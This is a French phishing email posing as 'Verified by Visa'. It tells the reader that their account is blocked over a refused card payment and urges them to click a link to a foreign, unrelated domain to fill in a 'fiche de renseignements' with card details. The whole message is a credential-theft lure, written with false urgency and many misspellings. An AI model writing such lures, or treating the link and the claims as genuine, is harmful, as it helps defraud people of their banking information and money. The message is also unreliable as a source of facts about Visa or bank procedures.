 Chers utilisateur Verified by Visa Chers abonne(e)s Verified by Visa , Bonjour, Votre Compte est bloquer , Car Nous avons remarquer un probleme sur votre Carte bancaire fair un prelevement automatique concemant le payment par carte de credit de votre facture,suite au refuse de votre etablissement bancaire et n'ayant pas pu vous joindre par telephone,nous avons cree une fich speciale,qui vous premet d'acceder directement au payment. Merci de ne pas repondre a ce message. cliquez sur le lien qui apparait en dessous de ce message pour pouvoir acceder a votre fich de renseignements.Bien vouloir lire attentivement la fiche et nous communiquer les renseignents utiles qui nous permettrons de prelever cette somme. Toute l'equipe comptabilite Verified by Visa vous remercie de votre tres bonne comprehention. veuillez cliquer sur le lien si dessous pour acceder a votre fich de renseignements: connexion directe (http://www.consultpyme.com.ar/tmp/wwww.FranceTelecom/banque/VerifiedBy-Visa/Votre-Carte-Bancaire/enquiries-europe) 